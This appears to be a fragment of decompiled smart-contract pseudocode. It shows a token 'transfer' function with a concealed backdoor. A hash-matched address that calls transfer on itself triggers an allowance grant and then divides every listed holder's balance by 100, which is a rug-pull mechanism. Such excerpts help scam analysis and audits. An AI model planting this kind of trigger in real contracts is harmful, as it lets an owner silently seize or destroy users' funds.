...
function transfer(address arg1, uint256 arg2) payable {
    ...
    if sha3(arg1) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
        if msg.sender == arg1:
            ...
            allowance[address(this.address)][stor15] = arg2
            emit Approval(arg2, this.address, stor15);
            ...
            if stor13:
                ...
                while idx < stor14.length:
                    ...
                    mem[0] = stor14[idx].field_0
                    mem[32] = 3
                    balanceOf[stor14[idx].field_0] = balanceOf[stor14[idx].field_0] / 100
                    if idx == -1:
                        revert with 'NH{q', 17
                    idx = idx + 1
                    continue 
